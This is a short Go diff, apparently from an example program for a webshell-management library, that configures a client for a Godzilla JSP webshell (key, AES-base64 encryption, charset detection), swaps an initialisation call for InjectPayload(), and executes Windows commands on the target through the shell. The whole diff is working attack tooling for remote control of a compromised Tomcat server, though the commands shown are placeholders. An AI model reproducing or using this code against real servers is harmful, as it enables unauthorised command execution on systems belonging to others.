@@ -17,6 +17,8 @@ const (
 )
 
 func main() {
+	log.SetFlags(log.Lshortfile)
+
 	info := &wsm.GodzillaInfo{
 		BaseShell: shell.BaseShell{
 			Url:      JspShellUrl,
@@ -26,17 +28,21 @@ func main() {
 			// base64 的加密模式必须加上这个 header 头
 			Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},
 		},
-		Key:    "key",
-		Crypto: godzilla.JAVA_AES_BASE64,
+		Key:      "key",
+		Crypto:   godzilla.JAVA_AES_BASE64,
+		Encoding: godzilla.Chardet,
 	}
 	g, err := wsm.NewGodzillaInfo(info)
 	if err != nil {
 		log.Println(err)
 	}
-	g.FirstBlood()
+	g.InjectPayload()
 
 	//isAlive := g.Ping(nil)
 	//fmt.Println(isAlive)
-	basicInfo := g.CommandExec()
+	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
+	//fmt.Println("Info : ", basicInfo1)
+
+	basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
 	fmt.Println("Info : ", basicInfo)
 }
